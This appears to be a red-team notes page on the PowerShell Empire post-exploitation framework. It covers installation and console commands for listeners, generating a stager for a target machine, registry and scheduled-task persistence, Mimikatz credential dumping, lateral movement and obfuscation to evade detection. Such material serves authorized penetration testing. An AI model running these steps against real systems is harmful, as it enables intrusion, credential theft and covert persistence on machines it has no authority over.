## Overview
PowerShell Empire is a post-exploitation framework that leverages PowerShell scripts and modules to provide robust capabilities for penetration testing and red team operations. It is designed to operate entirely in-memory, making it difficult to detect by traditional endpoint protection tools. PowerShell Empire supports a wide range of post-exploitation functionalities, including privilege escalation, credential harvesting, lateral movement, and persistence.

## Features
- **In-Memory Execution:** Executes payloads and modules entirely in-memory, avoiding writing to disk.
- **Modular Framework:** Includes a vast library of modules for various post-exploitation tasks.
- **Cross-Platform Compatibility:** Supports Windows, macOS, and Linux operating systems.
- **Stealth and Evasion:** Utilizes PowerShell and Python, which are often whitelisted in enterprise environments.
- **Customizable Agents:** Supports customizable agents that can be adapted for specific needs or environments.

## Website
- [PowerShell Empire GitHub Repository](https://github.com/BC-SECURITY/Empire)

## Installation

### On Unix-based systems (Linux/macOS):
1. **Install Dependencies:**
```sh
sudo apt-get update
sudo apt-get install powershell
sudo apt-get install git
sudo apt-get install python3-pip
```

2. **Clone the Empire Repository:**
```sh
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
```

3. **Install Empire:**
```sh
sudo ./setup/install.sh
```

### On Windows:
1. **Download and Install PowerShell:**
   - PowerShell Empire requires PowerShell to be installed. Download it from the [Microsoft PowerShell GitHub](https://github.com/PowerShell/PowerShell).

2. **Clone the Empire Repository:**
```sh
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
```

3. **Run the Setup Script:**
```sh
.\setup\install.ps1
```

## Basic Usage
PowerShell Empire is run from the command line interface (CLI). Here are some common commands and usage examples:

### Starting the Empire Server
1. **Run Empire:**
```sh
sudo ./empire
```

2. **Launch the Listener:**
   - In the Empire console, use:
```sh
listeners
```
   - Choose the listener type (e.g., `http`) and start it with:
```sh
uselistener http
execute
```

### Generating an Agent
1. **Generate a PowerShell Stager:**
```sh
usestager windows/launcher_bat
set Listener http
execute
```
   - Copy the generated PowerShell script to use on the target machine.

### Interacting with Agents
1. **List Active Agents:**
```sh
agents
```

2. **Interact with an Agent:**
```sh
interact <agent_name>
```

3. **Run a Module on an Agent:**
```sh
usemodule <module_name>
```
   - Example:
```sh
usemodule privesc/powerup/allchecks
execute
```

### Persistence Techniques
PowerShell Empire includes several modules to establish persistence on a compromised host:

- **Registry Persistence:**
```sh
usemodule persistence/elevated/registry
execute
```

- **Scheduled Task Persistence:**
```sh
usemodule persistence/elevated/schtasks
execute
```

## Advanced Features
PowerShell Empire offers several advanced features for more specific use cases:

### Credential Harvesting
- **Mimikatz Integration:**
  - Use the Mimikatz module to extract credentials from memory:
```sh
usemodule credentials/mimikatz/lsadump
execute
```

### Lateral Movement
- **Pass-the-Hash:**
  - Use the `pth` module to perform pass-the-hash attacks:
```sh
usemodule lateral_movement/invoke_wmi
execute
```

### Bypassing Detection
- **Obfuscate PowerShell Scripts:**
  - Use built-in obfuscation techniques to evade detection:
```sh
usestager windows/launcher_bat
set ObfuscateCommand True
execute
```

## Tools for Post-Exploitation Using PowerShell Empire

- **Credential Dumping:** Extract credentials from memory using modules like Mimikatz.
- **Privilege Escalation:** Use built-in modules to identify privilege escalation vectors.
- **Data Exfiltration:** Exfiltrate data over HTTP, HTTPS, or other covert channels.
- **Remote Execution:** Execute commands and scripts on compromised hosts.

## Best Practices
- **Limit Use to Authorized Testing:** Only use PowerShell Empire for authorized penetration testing and red team engagements.
- **Avoid Detection:** Use obfuscation and in-memory execution to minimize the risk of detection.
- **Clean Up After Use:** Remove all artifacts and persistence mechanisms after testing to avoid leaving backdoors.
- **Keep Empire Updated:** Regularly update PowerShell Empire to benefit from new features and modules.
- **Combine with Other Tools:** Use Empire alongside other post-exploitation frameworks like [[Metasploit]], [[Cobalt Strike]], and [[Responder]] for comprehensive assessments.

## References
- [PowerShell Empire GitHub Repository](https://github.com/BC-SECURITY/Empire)
- [Empire User Guide](https://bc-security.gitbook.io/empire-user-guide/)
- [PowerShell Security Best Practices](https://docs.microsoft.com/en-us/powershell/scripting/security/overview?view=powershell-7.1)

